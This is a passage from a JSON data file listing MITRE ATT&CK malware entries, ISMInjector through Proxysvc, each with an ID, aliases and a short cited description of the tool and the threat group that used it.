    "name": "ISMInjector",
    "examples": [],
    "similar_words": [
      "ISMInjector"
    ],
    "description": "[ISMInjector](https://attack.mitre.org/software/S0189) is a Trojan used to install another [OilRig](https://attack.mitre.org/groups/G0049) backdoor, ISMAgent. (Citation: OilRig New Delivery Oct 2017)",
    "example_uses": []
  },
  "malware--c8b6cc43-ce61-42ae-87f3-a5f10526f952": {
    "id": "S0259",
    "name": "InnaputRAT",
    "examples": [],
    "similar_words": [
      "InnaputRAT"
    ],
    "description": "[InnaputRAT](https://attack.mitre.org/software/S0259) is a remote access tool that can exfiltrate files from a victim’s machine. [InnaputRAT](https://attack.mitre.org/software/S0259) has been seen out in the wild since 2016. (Citation: ASERT InnaputRAT April 2018)",
    "example_uses": []
  },
  "malware--47afe41c-4c08-485e-b062-c3bd209a1cce": {
    "id": "S0260",
    "name": "InvisiMole",
    "examples": [],
    "similar_words": [
      "InvisiMole"
    ],
    "description": "[InvisiMole](https://attack.mitre.org/software/S0260) is a modular spyware program that has been used by the InvisiMole Group since at least 2013. [InvisiMole](https://attack.mitre.org/software/S0260) has two backdoor modules called RC2FM and RC2CL that are used to perform post-exploitation activities. It has been discovered on compromised victims in the Ukraine and Russia. [Gamaredon Group](https://attack.mitre.org/groups/G0047) infrastructure has been used to download and execute [InvisiMole](https://attack.mitre.org/software/S0260) against a small number of victims.(Citation: ESET InvisiMole June 2018)(Citation: ESET InvisiMole June 2020)",
    "example_uses": []
  },
  "malware--8beac7c2-48d2-4cd9-9b15-6c452f38ac06": {
    "id": "S0015",
    "name": "Ixeshe",
    "examples": [],
    "similar_words": [
      "Ixeshe"
    ],
    "description": "[Ixeshe](https://attack.mitre.org/software/S0015) is a malware family that has been used since at least 2009 against targets in East Asia. (Citation: Moran 2013)",
    "example_uses": []
  },
  "malware--8ae43c46-57ef-47d5-a77a-eebb35628db2": {
    "id": "S0044",
    "name": "JHUHUGIT",
    "examples": [],
    "similar_words": [
      "JHUHUGIT",
      "Trojan.Sofacy",
      "Seduploader",
      "JKEYSKW",
      "Sednit",
      "GAMEFISH",
      "SofacyCarberp"
    ],
    "description": "[JHUHUGIT](https://attack.mitre.org/software/S0044) is malware used by [APT28](https://attack.mitre.org/groups/G0007). It is based on Carberp source code and serves as reconnaissance malware. (Citation: Kaspersky Sofacy) (Citation: F-Secure Sofacy 2015) (Citation: ESET Sednit Part 1) (Citation: FireEye APT28 January 2017)",
    "example_uses": []
  },
  "malware--de6cb631-52f6-4169-a73b-7965390b0c30": {
    "id": "S0201",
    "name": "JPIN",
    "examples": [],
    "similar_words": [
      "JPIN"
    ],
    "description": "[JPIN](https://attack.mitre.org/software/S0201) is a custom-built backdoor family used by [PLATINUM](https://attack.mitre.org/groups/G0068). Evidence suggests developers of [JPIN](https://attack.mitre.org/software/S0201) and [Dipsind](https://attack.mitre.org/software/S0200) code bases were related in some way. (Citation: Microsoft PLATINUM April 2016)",
    "example_uses": []
  },
  "malware--234e7770-99b0-4f65-b983-d3230f76a60b": {
    "id": "S0163",
    "name": "Janicab",
    "examples": [],
    "similar_words": [
      "Janicab"
    ],
    "description": "[Janicab](https://attack.mitre.org/software/S0163) is an OS X trojan that relied on a valid developer ID and oblivious users to install it. (Citation: Janicab)",
    "example_uses": []
  },
  "malware--3c02fb1f-cbdb-48f5-abaf-8c81d6e0c322": {
    "id": "S0215",
    "name": "KARAE",
    "examples": [],
    "similar_words": [
      "KARAE"
    ],
    "description": "[KARAE](https://attack.mitre.org/software/S0215) is a backdoor typically used by [APT37](https://attack.mitre.org/groups/G0067) as first-stage malware. (Citation: FireEye APT37 Feb 2018)",
    "example_uses": []
  },
  "malware--11e36d5b-6a92-4bf9-8eb7-85eb24f59e22": {
    "id": "S0271",
    "name": "KEYMARBLE",
    "examples": [],
    "similar_words": [
      "KEYMARBLE"
    ],
    "description": "[KEYMARBLE](https://attack.mitre.org/software/S0271) is a Trojan that has reportedly been used by the North Korean government. (Citation: US-CERT KEYMARBLE Aug 2018)",
    "example_uses": []
  },
  "malware--7dbb67c7-270a-40ad-836e-c45f8948aa5a": {
    "id": "S0156",
    "name": "KOMPROGO",
    "examples": [],
    "similar_words": [
      "KOMPROGO"
    ],
    "description": "[KOMPROGO](https://attack.mitre.org/software/S0156) is a signature backdoor used by [APT32](https://attack.mitre.org/groups/G0050) that is capable of process, file, and registry management. (Citation: FireEye APT32 May 2017)",
    "example_uses": []
  },
  "malware--26fed817-e7bf-41f9-829a-9075ffac45c2": {
    "id": "S0088",
    "name": "Kasidet",
    "examples": [],
    "similar_words": [
      "Kasidet"
    ],
    "description": "[Kasidet](https://attack.mitre.org/software/S0088) is a backdoor that has been dropped by using malicious VBA macros. (Citation: Zscaler Kasidet)",
    "example_uses": []
  },
  "malware--536be338-e2ef-4a6b-afb6-8d5568b91eb2": {
    "id": "S0265",
    "name": "Kazuar",
    "examples": [],
    "similar_words": [
      "Kazuar"
    ],
    "description": "[Kazuar](https://attack.mitre.org/software/S0265) is a fully featured, multi-platform backdoor Trojan written using the Microsoft .NET framework. (Citation: Unit 42 Kazuar May 2017)",
    "example_uses": []
  },
  "malware--4b072c90-bc7a-432b-940e-016fc1c01761": {
    "id": "S0276",
    "name": "Keydnap",
    "examples": [],
    "similar_words": [
      "Keydnap",
      "OSX/Keydnap"
    ],
    "description": "This piece of malware steals the content of the user's keychain while maintaining a permanent backdoor  (Citation: OSX Keydnap malware).",
    "example_uses": []
  },
  "malware--f108215f-3487-489d-be8b-80e346d32518": {
    "id": "S0162",
    "name": "Komplex",
    "examples": [],
    "similar_words": [
      "Komplex"
    ],
    "description": "[Komplex](https://attack.mitre.org/software/S0162) is a backdoor that has been used by [APT28](https://attack.mitre.org/groups/G0007) on OS X and appears to be developed in a similar manner to [XAgentOSX](https://attack.mitre.org/software/S0161) (Citation: XAgentOSX 2017) (Citation: Sofacy Komplex Trojan).",
    "example_uses": []
  },
  "malware--c2417bab-3189-4d4d-9d60-96de2cdaf0ab": {
    "id": "S0236",
    "name": "Kwampirs",
    "examples": [],
    "similar_words": [
      "Kwampirs"
    ],
    "description": "[Kwampirs](https://attack.mitre.org/software/S0236) is a backdoor Trojan used by [Orangeworm](https://attack.mitre.org/groups/G0071). [Kwampirs](https://attack.mitre.org/software/S0236) has been found on machines which had software installed for the use and control of high-tech imaging devices such as X-Ray and MRI machines.(Citation: Symantec Orangeworm April 2018) [Kwampirs](https://attack.mitre.org/software/S0236) has multiple technical overlaps with [Shamoon](https://attack.mitre.org/software/S0140) based on reverse engineering analysis.(Citation: Cylera Kwampirs 2022)",
    "example_uses": []
  },
  "malware--2a6f4c7b-e690-4cc7-ab6b-1f821fb6b80b": {
    "id": "S0042",
    "name": "LOWBALL",
    "examples": [],
    "similar_words": [
      "LOWBALL"
    ],
    "description": "[LOWBALL](https://attack.mitre.org/software/S0042) is malware used by [admin@338](https://attack.mitre.org/groups/G0018). It was used in August 2015 in email messages targeting Hong Kong-based media organizations. (Citation: FireEye admin@338)",
    "example_uses": []
  },
  "malware--e9e9bfe2-76f4-4870-a2a1-b7af89808613": {
    "id": "S0211",
    "name": "Linfo",
    "examples": [],
    "similar_words": [
      "Linfo"
    ],
    "description": "[Linfo](https://attack.mitre.org/software/S0211) is a rootkit trojan used by [Elderwood](https://attack.mitre.org/groups/G0066) to open a backdoor on compromised hosts. (Citation: Symantec Elderwood Sept 2012) (Citation: Symantec Linfo May 2012)",
    "example_uses": []
  },
  "malware--251fbae2-78f6-4de7-84f6-194c727a64ad": {
    "id": "S0010",
    "name": "Lurid",
    "examples": [],
    "similar_words": [
      "Lurid",
      "Enfal"
    ],
    "description": "[Lurid](https://attack.mitre.org/software/S0010) is a malware family that has been used by several groups, including [PittyTiger](https://attack.mitre.org/groups/G0011), in targeted attacks as far back as 2006. (Citation: Villeneuve 2014) (Citation: Villeneuve 2011)",
    "example_uses": []
  },
  "malware--049ff071-0b3c-4712-95d2-d21c6aa54501": {
    "id": "S0233",
    "name": "MURKYTOP",
    "examples": [],
    "similar_words": [
      "MURKYTOP"
    ],
    "description": "[MURKYTOP](https://attack.mitre.org/software/S0233) is a reconnaissance tool used by [Leviathan](https://attack.mitre.org/groups/G0065). (Citation: FireEye Periscope March 2018)",
    "example_uses": []
  },
  "malware--f72251cb-2be5-421f-a081-99c29a1209e7": {
    "id": "S0282",
    "name": "MacSpy",
    "examples": [],
    "similar_words": [
      "MacSpy"
    ],
    "description": "[MacSpy](https://attack.mitre.org/software/S0282) is a malware-as-a-service offered on the darkweb  (Citation: objsee mac malware 2017).",
    "example_uses": []
  },
  "malware--1cc934e4-b01d-4543-a011-b988dfc1a458": {
    "id": "S0167",
    "name": "Matryoshka",
    "examples": [],
    "similar_words": [
      "Matroyshka",
      "Matryoshka"
    ],
    "description": "[Matryoshka](https://attack.mitre.org/software/S0167) is a malware framework used by [CopyKittens](https://attack.mitre.org/groups/G0052) that consists of a dropper, loader, and RAT. It has multiple versions; v1 was seen in the wild from July 2016 until January 2017. v2 has fewer commands and other minor differences. (Citation: ClearSky Wilted Tulip July 2017) (Citation: CopyKittens Nov 2015)",
    "example_uses": []
  },
  "malware--17dec760-9c8f-4f1b-9b4b-0ac47a453234": {
    "id": "S0133",
    "name": "Miner-C",
    "examples": [],
    "similar_words": [
      "Miner-C",
      "Mal/Miner-C",
      "PhotoMiner"
    ],
    "description": "[Miner-C](https://attack.mitre.org/software/S0133) is malware that mines victims for the Monero cryptocurrency. It has targeted FTP servers and Network Attached Storage (NAS) devices to spread. (Citation: Softpedia MinerC)",
    "example_uses": []
  },
  "malware--5e7ef1dc-7fb6-4913-ac75-e06113b59e0c": {
    "id": "S0051",
    "name": "MiniDuke",
    "examples": [],
    "similar_words": [
      "MiniDuke"
    ],
    "description": "[MiniDuke](https://attack.mitre.org/software/S0051) is malware that was used by [APT29](https://attack.mitre.org/groups/G0016) from 2010 to 2015. The [MiniDuke](https://attack.mitre.org/software/S0051) toolset consists of multiple downloader and backdoor components. The loader has been used with other [MiniDuke](https://attack.mitre.org/software/S0051) components as well as in conjunction with [CosmicDuke](https://attack.mitre.org/software/S0050) and [PinchDuke](https://attack.mitre.org/software/S0048). (Citation: F-Secure The Dukes)",
    "example_uses": []
  },
  "malware--e3cedcfe-6515-4348-af65-7f2c4157bf0d": {
    "id": "S0280",
    "name": "MirageFox",
    "examples": [],
    "similar_words": [
      "MirageFox"
    ],
    "description": "[MirageFox](https://attack.mitre.org/software/S0280) is a remote access tool used against Windows systems. It appears to be an upgraded version of a tool known as Mirage, which is a RAT believed to originate in 2012. (Citation: APT15 Intezer June 2018)",
    "example_uses": []
  },
  "malware--e1161124-f22e-487f-9d5f-ed8efc8dcd61": {
    "id": "S0084",
    "name": "Mis-Type",
    "examples": [],
    "similar_words": [
      "Mis-Type"
    ],
    "description": "[Mis-Type](https://attack.mitre.org/software/S0084) is a backdoor hybrid that was used in [Operation Dust Storm](https://attack.mitre.org/campaigns/C0016) by 2012.(Citation: Cylance Dust Storm)",
    "example_uses": []
  },
  "malware--0db09158-6e48-4e7c-8ce7-2b10b9c0c039": {
    "id": "S0083",
    "name": "Misdat",
    "examples": [],
    "similar_words": [
      "Misdat"
    ],
    "description": "[Misdat](https://attack.mitre.org/software/S0083) is a backdoor that was used in [Operation Dust Storm](https://attack.mitre.org/campaigns/C0016) from 2010 to 2011.(Citation: Cylance Dust Storm)",
    "example_uses": []
  },
  "malware--fbb470da-1d44-4f29-bbb3-9efbe20f94a3": {
    "id": "S0080",
    "name": "Mivast",
    "examples": [],
    "similar_words": [
      "Mivast"
    ],
    "description": "[Mivast](https://attack.mitre.org/software/S0080) is a backdoor that has been used by [Deep Panda](https://attack.mitre.org/groups/G0009). It was reportedly used in the Anthem breach. (Citation: Symantec Black Vine)",
    "example_uses": []
  },
  "malware--463f68f1-5cde-4dc2-a831-68b73488f8f4": {
    "id": "S0079",
    "name": "MobileOrder",
    "examples": [],
    "similar_words": [
      "MobileOrder"
    ],
    "description": "[MobileOrder](https://attack.mitre.org/software/S0079) is a Trojan intended to compromise Android mobile devices. It has been used by [Scarlet Mimic](https://attack.mitre.org/groups/G0029). (Citation: Scarlet Mimic Jan 2016)",
    "example_uses": []
  },
  "malware--9ea525fa-b0a9-4dde-84f2-bcea0137b3c1": {
    "id": "S0149",
    "name": "MoonWind",
    "examples": [],
    "similar_words": [
      "MoonWind"
    ],
    "description": "[MoonWind](https://attack.mitre.org/software/S0149) is a remote access tool (RAT) that was used in 2016 to target organizations in Thailand. (Citation: Palo Alto MoonWind March 2017)",
    "example_uses": []
  },
  "malware--bfd2738c-8b43-43c3-bc9f-d523c8e88bf4": {
    "id": "S0284",
    "name": "More_eggs",
    "examples": [],
    "similar_words": [
      "More_eggs"
    ],
    "description": "[More_eggs](https://attack.mitre.org/software/S0284) is a JScript backdoor used by [Cobalt Group](https://attack.mitre.org/groups/G0080) and [FIN6](https://attack.mitre.org/groups/G0037). Its name was given based on the variable \"More_eggs\" being present in its code. There are at least two different versions of the backdoor being used, version 2.0 and version 4.4. (Citation: Talos Cobalt Group July 2018)(Citation: Security Intelligence More Eggs Aug 2019)",
    "example_uses": []
  },
  "malware--92b55426-109f-4d93-899f-1833ce91ff90": {
    "id": "S0256",
    "name": "Mosquito",
    "examples": [],
    "similar_words": [
      "Mosquito"
    ],
    "description": "[Mosquito](https://attack.mitre.org/software/S0256) is a Win32 backdoor that has been used by [Turla](https://attack.mitre.org/groups/G0010). [Mosquito](https://attack.mitre.org/software/S0256) is made up of three parts: the installer, the launcher, and the backdoor. The main backdoor is called CommanderDLL and is launched by the loader program. (Citation: ESET Turla Mosquito Jan 2018)",
    "example_uses": []
  },
  "malware--d1183cb9-258e-4f2f-8415-50ac8252c49e": {
    "id": "S0272",
    "name": "NDiskMonitor",
    "examples": [],
    "similar_words": [
      "NDiskMonitor"
    ],
    "description": "[NDiskMonitor](https://attack.mitre.org/software/S0272) is a custom backdoor written in .NET that appears to be unique to [Patchwork](https://attack.mitre.org/groups/G0040). (Citation: TrendMicro Patchwork Dec 2017)",
    "example_uses": []
  },
  "malware--53cf6cc4-65aa-445a-bcf8-c3d296f8a7a2": {
    "id": "S0034",
    "name": "NETEAGLE",
    "examples": [],
    "similar_words": [
      "NETEAGLE"
    ],
    "description": "[NETEAGLE](https://attack.mitre.org/software/S0034) is a backdoor developed by [APT30](https://attack.mitre.org/groups/G0013) with compile dates as early as 2008. It has two main variants known as “Scout” and “Norton.” (Citation: FireEye APT30)",
    "example_uses": []
  },
  "malware--2a70812b-f1ef-44db-8578-a496a227aef2": {
    "id": "S0198",
    "name": "NETWIRE",
    "examples": [],
    "similar_words": [
      "NETWIRE"
    ],
    "description": "[NETWIRE](https://attack.mitre.org/software/S0198) is a publicly available, multiplatform remote administration tool (RAT) that has been used by criminal and APT groups since at least 2012.(Citation: FireEye APT33 Sept 2017)(Citation: McAfee Netwire Mar 2015)(Citation: FireEye APT33 Webinar Sept 2017)",
    "example_uses": []
  },
  "malware--48523614-309e-43bf-a2b8-705c2b45d7b2": {
    "id": "S0205",
    "name": "Naid",
    "examples": [],
    "similar_words": [
      "Naid"
    ],
    "description": "[Naid](https://attack.mitre.org/software/S0205) is a trojan used by [Elderwood](https://attack.mitre.org/groups/G0066) to open a backdoor on compromised hosts. (Citation: Symantec Elderwood Sept 2012) (Citation: Symantec Naid June 2012)",
    "example_uses": []
  },
  "malware--705f0783-5f7d-4491-b6b7-9628e6e006d2": {
    "id": "S0228",
    "name": "NanHaiShu",
    "examples": [],
    "similar_words": [
      "NanHaiShu"
    ],
    "description": "[NanHaiShu](https://attack.mitre.org/software/S0228) is a remote access tool and JScript backdoor used by [Leviathan](https://attack.mitre.org/groups/G0065). [NanHaiShu](https://attack.mitre.org/software/S0228) has been used to target government and private-sector organizations that have relations to the South China Sea dispute. (Citation: Proofpoint Leviathan Oct 2017) (Citation: fsecure NanHaiShu July 2016)",
    "example_uses": []
  },
  "malware--53a42597-1974-4b8e-84fd-3675e8992053": {
    "id": "S0247",
    "name": "NavRAT",
    "examples": [],
    "similar_words": [
      "NavRAT"
    ],
    "description": "[NavRAT](https://attack.mitre.org/software/S0247) is a remote access tool designed to upload, download, and execute files. It has been observed in attacks targeting South Korea. (Citation: Talos NavRAT May 2018)",
    "example_uses": []
  },
  "malware--c251e4a5-9a2e-4166-8e42-442af75c3b9a": {
    "id": "S0210",
    "name": "Nerex",
    "examples": [],
    "similar_words": [
      "Nerex"
    ],
    "description": "[Nerex](https://attack.mitre.org/software/S0210) is a Trojan used by [Elderwood](https://attack.mitre.org/groups/G0066) to open a backdoor on compromised hosts. (Citation: Symantec Elderwood Sept 2012) (Citation: Symantec Nerex May 2012)",
    "example_uses": []
  },
  "malware--fde50aaa-f5de-4cb8-989a-babb57d6a704": {
    "id": "S0056",
    "name": "Net Crawler",
    "examples": [],
    "similar_words": [
      "Net Crawler",
      "NetC"
    ],
    "description": "[Net Crawler](https://attack.mitre.org/software/S0056) is an intranet worm capable of extracting credentials using credential dumpers and spreading to systems on a network over SMB by brute forcing accounts with recovered passwords and using [PsExec](https://attack.mitre.org/software/S0029) to execute a copy of [Net Crawler](https://attack.mitre.org/software/S0056). (Citation: Cylance Cleaver)",
    "example_uses": []
  },
  "malware--cafd0bf8-2b9c-46c7-ae3c-3e0f42c5062e": {
    "id": "S0033",
    "name": "NetTraveler",
    "examples": [],
    "similar_words": [
      "NetTraveler"
    ],
    "description": "[NetTraveler](https://attack.mitre.org/software/S0033) is malware that has been used in multiple cyber espionage campaigns for basic surveillance of victims. The earliest known samples have timestamps back to 2005, and the largest number of observed samples were created between 2010 and 2013. (Citation: Kaspersky NetTraveler)",
    "example_uses": []
  },
  "malware--9e9b9415-a7df-406b-b14d-92bfe6809fbe": {
    "id": "S0118",
    "name": "Nidiran",
    "examples": [],
    "similar_words": [
      "Nidiran",
      "Backdoor.Nidiran"
    ],
    "description": "[Nidiran](https://attack.mitre.org/software/S0118) is a custom backdoor developed and used by [Suckfly](https://attack.mitre.org/groups/G0039). It has been delivered via strategic web compromise. (Citation: Symantec Suckfly March 2016)",
    "example_uses": []
  },
  "malware--2dd34b01-6110-4aac-835d-b5e7b936b0be": {
    "id": "S0138",
    "name": "OLDBAIT",
    "examples": [],
    "similar_words": [
      "OLDBAIT",
      "Sasfis"
    ],
    "description": "[OLDBAIT](https://attack.mitre.org/software/S0138) is a credential harvester used by [APT28](https://attack.mitre.org/groups/G0007). (Citation: FireEye APT28) (Citation: FireEye APT28 January 2017)",
    "example_uses": []
  },
  "malware--f6d1d2cb-12f5-4221-9636-44606ea1f3f8": {
    "id": "S0165",
    "name": "OSInfo",
    "examples": [],
    "similar_words": [
      "OSInfo"
    ],
    "description": "[OSInfo](https://attack.mitre.org/software/S0165) is a custom tool used by [APT3](https://attack.mitre.org/groups/G0022) to do internal discovery on a victim's computer and network. (Citation: Symantec Buckeye)",
    "example_uses": []
  },
  "malware--b136d088-a829-432c-ac26-5529c26d4c7e": {
    "id": "S0052",
    "name": "OnionDuke",
    "examples": [],
    "similar_words": [
      "OnionDuke"
    ],
    "description": "[OnionDuke](https://attack.mitre.org/software/S0052) is malware that was used by [APT29](https://attack.mitre.org/groups/G0016) from 2013 to 2015. (Citation: F-Secure The Dukes)",
    "example_uses": []
  },
  "malware--8e101fdd-9f7f-4916-bb04-6bd9e94c129c": {
    "id": "S0264",
    "name": "OopsIE",
    "examples": [],
    "similar_words": [
      "OopsIE"
    ],
    "description": "[OopsIE](https://attack.mitre.org/software/S0264) is a Trojan used by [OilRig](https://attack.mitre.org/groups/G0049) to remotely execute commands as well as upload/download files to/from victims. (Citation: Unit 42 OopsIE! Feb 2018)",
    "example_uses": []
  },
  "malware--06d735e7-1db1-4dbe-ab4b-acbe419f902b": {
    "id": "S0229",
    "name": "Orz",
    "examples": [],
    "similar_words": [
      "AIRBREAK",
      "Orz"
    ],
    "description": "[Orz](https://attack.mitre.org/software/S0229) is a custom JavaScript backdoor used by [Leviathan](https://attack.mitre.org/groups/G0065). It was observed being used in 2014 as well as in August 2017 when it was dropped by Microsoft Publisher files. (Citation: Proofpoint Leviathan Oct 2017) (Citation: FireEye Periscope March 2018)",
    "example_uses": []
  },
  "malware--a60657fa-e2e7-4f8f-8128-a882534ae8c5": {
    "id": "S0072",
    "name": "OwaAuth",
    "examples": [],
    "similar_words": [
      "OwaAuth"
    ],
    "description": "[OwaAuth](https://attack.mitre.org/software/S0072) is a Web shell and credential stealer deployed to Microsoft Exchange servers that appears to be exclusively used by [Threat Group-3390](https://attack.mitre.org/groups/G0027). (Citation: Dell TG-3390)",
    "example_uses": []
  },
  "malware--b2c5d3ca-b43a-4888-ad8d-e2d43497bf85": {
    "id": "S0016",
    "name": "P2P ZeuS",
    "examples": [],
    "similar_words": [
      "P2P ZeuS",
      "Peer-to-Peer ZeuS",
      "Gameover ZeuS"
    ],
    "description": "[P2P ZeuS](https://attack.mitre.org/software/S0016) is a closed-source fork of the leaked version of the ZeuS botnet. It presents improvements over the leaked version, including a peer-to-peer architecture. (Citation: Dell P2P ZeuS)",
    "example_uses": []
  },
  "malware--f6ae7a52-f3b6-4525-9daf-640c083f006e": {
    "id": "S0158",
    "name": "PHOREAL",
    "examples": [],
    "similar_words": [
      "PHOREAL"
    ],
    "description": "[PHOREAL](https://attack.mitre.org/software/S0158) is a signature backdoor used by [APT32](https://attack.mitre.org/groups/G0050). (Citation: FireEye APT32 May 2017)",
    "example_uses": []
  },
  "malware--21c0b55b-5ff3-4654-a05e-e3fc1ee1ce1b": {
    "id": "S0254",
    "name": "PLAINTEE",
    "examples": [],
    "similar_words": [
      "PLAINTEE"
    ],
    "description": "[PLAINTEE](https://attack.mitre.org/software/S0254) is a malware sample that has been used by [Rancor](https://attack.mitre.org/groups/G0075) in targeted attacks in Singapore and Cambodia. (Citation: Rancor Unit42 June 2018)",
    "example_uses": []
  },
  "malware--53d47b09-09c2-4015-8d37-6633ecd53f79": {
    "id": "S0216",
    "name": "POORAIM",
    "examples": [],
    "similar_words": [
      "POORAIM"
    ],
    "description": "[POORAIM](https://attack.mitre.org/software/S0216) is a backdoor used by [APT37](https://attack.mitre.org/groups/G0067) in campaigns since at least 2014. (Citation: FireEye APT37 Feb 2018)",
    "example_uses": []
  },
  "malware--5e595477-2e78-4ce7-ae42-e0b059b17808": {
    "id": "S0150",
    "name": "POSHSPY",
    "examples": [],
    "similar_words": [
      "POSHSPY"
    ],
    "description": "[POSHSPY](https://attack.mitre.org/software/S0150) is a backdoor that has been used by [APT29](https://attack.mitre.org/groups/G0016) since at least 2015. It appears to be used as a secondary backdoor used if the actors lost access to their primary backdoors. (Citation: FireEye POSHSPY April 2017)",
    "example_uses": []
  },
  "malware--17e919aa-4a49-445c-b103-dbb8df9e7351": {
    "id": "S0145",
    "name": "POWERSOURCE",
    "examples": [],
    "similar_words": [
      "POWERSOURCE",
      "DNSMessenger"
    ],
    "description": "[POWERSOURCE](https://attack.mitre.org/software/S0145) is a PowerShell backdoor that is a heavily obfuscated and modified version of the publicly available tool DNS_TXT_Pwnage. It was observed in February 2017 in spearphishing campaigns against personnel involved with United States Securities and Exchange Commission (SEC) filings at various organizations. The malware was delivered when macros were enabled by the victim and a VBS script was dropped. (Citation: FireEye FIN7 March 2017) (Citation: Cisco DNSMessenger March 2017)",
    "example_uses": []
  },
  "malware--e8545794-b98c-492b-a5b3-4b5a02682e37": {
    "id": "S0223",
    "name": "POWERSTATS",
    "examples": [],
    "similar_words": [
      "POWERSTATS",
      "Powermud"
    ],
    "description": "[POWERSTATS](https://attack.mitre.org/software/S0223) is a PowerShell-based first stage backdoor used by [MuddyWater](https://attack.mitre.org/groups/G0069). (Citation: Unit 42 MuddyWater Nov 2017)",
    "example_uses": []
  },
  "malware--09b2cd76-c674-47cc-9f57-d2f2ad150a46": {
    "id": "S0184",
    "name": "POWRUNER",
    "examples": [],
    "similar_words": [
      "POWRUNER"
    ],
    "description": "[POWRUNER](https://attack.mitre.org/software/S0184) is a PowerShell script that sends and receives commands to and from the C2 server. (Citation: FireEye APT34 Dec 2017)",
    "example_uses": []
  },
  "malware--5c6ed2dc-37f4-40ea-b2e1-4c76140a388c": {
    "id": "S0196",
    "name": "PUNCHBUGGY",
    "examples": [],
    "similar_words": [
      "PUNCHBUGGY"
    ],
    "description": "[PUNCHBUGGY](https://attack.mitre.org/software/S0196) is a backdoor malware used by [FIN8](https://attack.mitre.org/groups/G0061) that has been observed targeting POS networks in the hospitality industry. (Citation: Morphisec ShellTea June 2019)(Citation: FireEye Fin8 May 2016) (Citation: FireEye Know Your Enemy FIN8 Aug 2016)",
    "example_uses": []
  },
  "malware--c4de7d83-e875-4c88-8b5d-06c41e5b7e79": {
    "id": "S0197",
    "name": "PUNCHTRACK",
    "examples": [],
    "similar_words": [
      "PUNCHTRACK",
      "PSVC"
    ],
    "description": "[PUNCHTRACK](https://attack.mitre.org/software/S0197) is non-persistent point of sale (POS) system malware utilized by [FIN8](https://attack.mitre.org/groups/G0061) to scrape payment card data. (Citation: FireEye Fin8 May 2016) (Citation: FireEye Know Your Enemy FIN8 Aug 2016)",
    "example_uses": []
  },
  "malware--e811ff6a-4cef-4856-a6ae-a7daf9ed39ae": {
    "id": "S0208",
    "name": "Pasam",
    "examples": [],
    "similar_words": [
      "Pasam"
    ],
    "description": "[Pasam](https://attack.mitre.org/software/S0208) is a trojan used by [Elderwood](https://attack.mitre.org/groups/G0066) to open a backdoor on compromised hosts. (Citation: Symantec Elderwood Sept 2012) (Citation: Symantec Pasam May 2012)",
    "example_uses": []
  },
  "malware--ae9d818d-95d0-41da-b045-9cabea1ca164": {
    "id": "S0048",
    "name": "PinchDuke",
    "examples": [],
    "similar_words": [
      "PinchDuke"
    ],
    "description": "[PinchDuke](https://attack.mitre.org/software/S0048) is malware that was used by [APT29](https://attack.mitre.org/groups/G0016) from 2008 to 2010. (Citation: F-Secure The Dukes)",
    "example_uses": []
  },
  "malware--b96680d1-5eb3-4f07-b95c-00ab904ac236": {
    "id": "S0124",
    "name": "Pisloader",
    "examples": [],
    "similar_words": [
      "Pisloader"
    ],
    "description": "[Pisloader](https://attack.mitre.org/software/S0124) is a malware family that is notable due to its use of DNS as a C2 protocol as well as its use of anti-analysis tactics. It has been used by [APT18](https://attack.mitre.org/groups/G0026) and is similar to another malware family, [HTTPBrowser](https://attack.mitre.org/software/S0070), that has been used by the group. (Citation: Palo Alto DNS Requests)",
    "example_uses": []
  },
  "malware--64fa0de0-6240-41f4-8638-f4ca7ed528fd": {
    "id": "S0013",
    "name": "PlugX",
    "examples": [],
    "similar_words": [
      "PlugX",
      "DestroyRAT",
      "Sogu",
      "Kaba",
      "Korplug"
    ],
    "description": "[PlugX](https://attack.mitre.org/software/S0013) is a remote access tool (RAT) with modular plugins that has been used by multiple threat groups.(Citation: Lastline PlugX Analysis)(Citation: FireEye Clandestine Fox Part 2)(Citation: New DragonOK)(Citation: Dell TG-3390)",
    "example_uses": []
  },
  "malware--b42378e0-f147-496f-992a-26a49705395b": {
    "id": "S0012",
    "name": "PoisonIvy",
    "examples": [],
    "similar_words": [
      "PoisonIvy",
      "Poison Ivy",
      "Darkmoon"
    ],
    "description": "[PoisonIvy](https://attack.mitre.org/software/S0012) is a popular remote access tool (RAT) that has been used by many groups.(Citation: FireEye Poison Ivy)(Citation: Symantec Elderwood Sept 2012)(Citation: Symantec Darkmoon Aug 2005)",
    "example_uses": []
  },
  "malware--0a9c51e0-825d-4b9b-969d-ce86ed8ce3c3": {
    "id": "S0177",
    "name": "Power Loader",
    "examples": [],
    "similar_words": [
      "Power Loader",
      "Win32/Agent.UAW"
    ],
    "description": "[Power Loader](https://attack.mitre.org/software/S0177) is modular code sold in the cybercrime market used as a downloader in malware families such as Carberp, Redyms and Gapz. (Citation: MalwareTech Power Loader Aug 2013) (Citation: WeLiveSecurity Gapz and Redyms Mar 2013)",
    "example_uses": []
  },
  "malware--00c3bfcb-99bd-4767-8c03-b08f585f5c8a": {
    "id": "S0139",
    "name": "PowerDuke",
    "examples": [],
    "similar_words": [
      "PowerDuke"
    ],
    "description": "[PowerDuke](https://attack.mitre.org/software/S0139) is a backdoor that was used by [APT29](https://attack.mitre.org/groups/G0016) in 2016. It has primarily been delivered through Microsoft Word or Excel attachments containing malicious macros. (Citation: Volexity PowerDuke November 2016)",
    "example_uses": []
  },
  "malware--37cc7eb6-12e3-467b-82e8-f20f2cc73c69": {
    "id": "S0113",
    "name": "Prikormka",
    "examples": [],
    "similar_words": [
      "Prikormka"
    ],
    "description": "[Prikormka](https://attack.mitre.org/software/S0113) is a malware family used in a campaign known as Operation Groundbait. It has predominantly been observed in Ukraine and was used as early as 2008. (Citation: ESET Operation Groundbait)",
    "example_uses": []
  },
  "malware--c541efb4-e7b1-4ad6-9da8-b4e113f5dd42": {
    "id": "S0279",
    "name": "Proton",
    "examples": [],
    "similar_words": [
      "Proton"
    ],
    "description": "[Proton](https://attack.mitre.org/software/S0279) is a macOS backdoor focusing on data theft and credential access  (Citation: objsee mac malware 2017).",
    "example_uses": []
  },
  "malware--069af411-9b24-4e85-b26c-623d035bbe84": {
    "id": "S0238",
    "name": "Proxysvc",
    "examples": [],
    "similar_words": [
      "Proxysvc"
    ],
    "description": "[Proxysvc](https://attack.mitre.org/software/S0238) is a malicious DLL used by [Lazarus Group](https://attack.mitre.org/groups/G0032) in a campaign known as Operation GhostSecret. It has appeared to be operating undetected since 2017 and was mostly observed in higher education organizations. The goal of [Proxysvc](https://attack.mitre.org/software/S0238) is to deliver additional payloads to the target and to maintain control for the attacker. It is in the form of a DLL that can also be executed as a standalone process. (Citation: McAfee GhostSecret)",
    "example_uses": []
  },
  "malware--dfb5fa9b-3051-4b97-8035-08f80aef945b": {
